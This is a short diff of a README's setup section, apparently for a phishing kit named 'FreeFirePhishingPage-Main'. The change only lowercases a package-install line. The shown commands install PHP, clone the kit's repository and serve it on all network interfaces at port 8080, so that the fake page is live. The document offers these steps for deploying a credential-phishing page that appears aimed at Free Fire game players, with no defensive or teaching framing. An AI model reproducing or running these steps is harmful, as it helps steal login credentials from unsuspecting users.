@@ -11,7 +11,7 @@
 ## ⚙️ SETUP
 
 ```bash
-PKG INSTALL PHP -Y
+pkg install php -y
 git clone https://github.com/Xcn1ck2/FreeFirePhishingPage-Main
 cd FreeFirePhishingPage-Main
 php -S 0.0.0.0:8080
